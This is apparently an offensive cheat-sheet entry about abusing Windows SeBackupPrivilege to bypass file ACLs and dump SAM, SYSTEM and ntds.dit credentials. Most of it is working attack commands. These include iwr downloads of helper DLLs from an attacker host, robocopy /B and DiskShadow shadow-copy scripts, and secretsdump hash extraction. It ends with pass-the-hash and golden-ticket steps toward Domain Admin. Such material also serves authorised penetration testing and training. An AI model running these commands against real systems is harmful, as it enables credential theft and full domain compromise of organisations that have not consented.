title: SeBackupPrivilege — Read-Anywhere → SAM / ntds.dit → DA
body: SeBackupPrivilege opens any file with FILE_FLAG_BACKUP_SEMANTICS, bypassing every NTFS read ACL. On a local box pull SAM+SYSTEM for local hashes. On a Domain Controller pull ntds.dit for every domain user hash — Domain Admin in one step. Auto-assigned to Backup Operators (who also get SeRestore) and Server Operators. Four techniques: robocopy /B for non-VSS-locked files (simplest), DiskShadow + Copy-FileSeBackupPrivilege for the locked ntds.dit on a live DC, wmic shadowcopy as an alternative VSS trigger, and direct sensitive-file reads without any snapshot. Always enable the privilege first — Disabled by default.
cmd:
# ⭐ PATH (local box): robocopy /B to pull SAM+SYSTEM → secretsdump LOCAL → PtH.
#    PATH (on a DC):  DiskShadow snapshot → robocopy /B ntds.dit → every domain hash → DA.

# ══ ⭐ HAVE SeBackupPrivilege? — read ANY file, bypass ACLs completely ══
# "Backup files and directories" = open any file with FILE_FLAG_BACKUP_SEMANTICS,
# bypassing every NTFS read ACL. On a local box: pull SAM+SYSTEM = local hashes.
# On a DOMAIN CONTROLLER: pull ntds.dit = every domain user's hash = DA.
# Auto-assigned to Backup Operators (+ SeRestore) AND Server Operators.
# ENABLE first — Disabled by default.
whoami /priv | findstr /i SeBackup
# enable (pick one):
iwr http://$lhost/SeBackupPrivilegeCmdLets.dll -OutFile SeBackupPrivilegeCmdLets.dll
iwr http://$lhost/SeBackupPrivilegeUtils.dll   -OutFile SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll ; Import-Module .\SeBackupPrivilegeUtils.dll
Set-SeBackupPrivilege ; Get-SeBackupPrivilege    # confirm Enabled

# ══════════════════════════════════════════════════════
# A) robocopy /B — simplest, pulls any file bypassing ACLs
# ══════════════════════════════════════════════════════
# /B = backup mode (uses SeBackupPrivilege). Works on non-VSS-locked files.
robocopy /B C:\Windows\System32\Config C:\Windows\Temp SAM SYSTEM SECURITY
# grab on Kali:  download / smbclient / evil-winrm download
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY local
# -> NT hashes -> pass-the-hash as local admin / crack weak ones

# ══════════════════════════════════════════════════════
# B) DiskShadow + Copy-FileSeBackupPrivilege → ntds.dit  (DC = Domain Admin)
# ══════════════════════════════════════════════════════
# ntds.dit is locked by the NTDS service — VSS snapshot needed to read it.
# DiskShadow is a Microsoft-signed LOLBIN (always on Server).
# Step 1: create the shadow script (save as C:\Windows\Temp\shadow.txt):
#   set context persistent nowriters
#   set metadata C:\Windows\Temp\meta.cab
#   set verbose on
#   add volume C: alias cdrive
#   create
#   expose %cdrive% Z:
#   exit
diskshadow.exe /s C:\Windows\Temp\shadow.txt    # snapshot C:, exposed as Z:
# Step 2: copy ntds.dit from the snapshot (ACL bypass via SeBackup module):
Copy-FileSeBackupPrivilege Z:\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit -Overwrite
# Step 3: grab the SYSTEM hive (decrypts ntds.dit):
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
# Step 4: exfil + dump on Kali:
impacket-secretsdump -ntds ntds.dit -system SYSTEM local
# -> krbtgt + every domain hash -> PtH as DA, golden ticket, done.

# ══════════════════════════════════════════════════════
# C) wmic shadowcopy — alternative VSS trigger (no DiskShadow)
# ══════════════════════════════════════════════════════
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows                    # note the shadow copy path
# then robocopy /B from the VSS path:
robocopy /B "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS" C:\Windows\Temp ntds.dit

# ══════════════════════════════════════════════════════
# D) Copy arbitrary sensitive files (no shadow needed)
# ══════════════════════════════════════════════════════
# SeBackup opens any file with bypass semantics — use it to read things
# you'd normally get Access Denied on:
Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\secret.txt C:\Windows\Temp\x.txt
robocopy /B C:\Users\Administrator\Desktop C:\Windows\Temp /e     # whole dir

# ── GOTCHAS ──────────────────────────────────────────
# - ENABLE the priv first — Disabled means nothing until Set-SeBackupPrivilege.
# - ntds.dit is LOCKED by NTDS service on a live DC — direct copy fails.
#   MUST use DiskShadow/wmic to snapshot then pull from the shadow copy.
# - reg save HKLM\SAM also works for local hives (no DLL needed, no VSS).
# - On a DC: SeBackup = Domain Admin. Pull ntds.dit, crack/PtH krbtgt for a
#   golden ticket, or PtH the Administrator hash direct.
# - SeBackup + SeRestore together = Backup Operators = the most common group
#   that hands you this on a DC (check group membership: whoami /groups).
warn: Enable SeBackupPrivilege first — Disabled means nothing (Set-SeBackupPrivilege). ntds.dit is LOCKED by the NTDS service on a live DC — direct robocopy /B fails with sharing violation. You MUST snapshot first (DiskShadow or wmic), then pull from the shadow copy. reg save HKLM\SAM works without DLL or VSS for local hives. SeBackup + SeRestore = Backup Operators — check whoami /groups if you see either priv; you likely have both. On a DC this combination = Domain Admin via ntds.dit.

choices.label: Dumped SAM / ntds.dit — crack or pass-the-hash
Got every domain hash — golden ticket / DA
